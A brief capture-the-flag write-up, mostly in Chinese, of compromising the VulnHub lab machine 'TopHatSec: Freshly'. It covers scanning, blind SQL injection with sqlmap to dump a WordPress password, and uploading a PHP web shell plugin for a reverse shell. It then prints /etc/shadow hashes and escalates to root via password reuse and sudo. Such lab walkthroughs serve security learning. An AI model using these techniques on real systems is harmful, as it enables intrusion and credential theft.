# TopHatSec: Freshly

2024-11-6 https://www.vulnhub.com/entry/tophatsec-freshly,118/

difficulty: Not easy

## IP

192.168.5.39

## Scan

```
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
```

目录扫描发现 http://192.168.5.39/login.php 看看有没有 sql 注入漏洞，经过测试存在 sql 盲注，直接使用 sqlmap 进行读取，发现如下数据库：

```
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080
```

8080 的 web 服务上有一个 wordpress 系统，优先查看 wordpress8080 这个数据库，获得其中 wp_users 中的数据：

```
Database: wordpress8080
[1 table]
+-------+
| users |
+-------+

Database: wordpress8080
Table: users
[1 entry]
+---------------------+----------+
| password            | username |
+---------------------+----------+
| SuperSecretPassword | admin    |
+---------------------+----------+
```

在 8080 端口上的 wordpress 进行登陆，http://192.168.5.39:8080/wordpress/wp-login.php 登陆成功

将 php web shell 打成 zip，然后在 Plugins -> Add New 中上传 zip，然后在 kali 上创建监听，访问 http://192.168.5.39:8080/wordpress/wp-content/upgrade/8888/8888.php 就获得了反弹的 shell。

查看提权路径，发现 /etc/shadow 可读：

```
root:$6$If.Y9A3d$L1/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/:16483:0:99999:7:::
user:$6$MuqQZq4i$t/lNztnPTqUCvKeO/vvHd9nVe3yRoES5fEguxxHnOf3jR/zUl0SFs825OM4MuCWlV7H/k2QCKiZ3zso.31Kk31:16483:0:99999:7:::
candycane:$6$gfTgfe6A$pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa/:16483:0:99999:7:::
```

没有找到 root 的密码，在/home 目录只发现了一个用户 user，尝试用 SuperSecretPassword 这个密码去切换到 user 用户，切换成功，这里存在密码复用的问题。

sudo -l 发现存在最高权限：

```
(ALL : ALL) ALL
```

```
user@Freshly:~$ sudo /bin/bash
root@Freshly:~# id
uid=0(root) gid=0(root) groups=0(root)
```
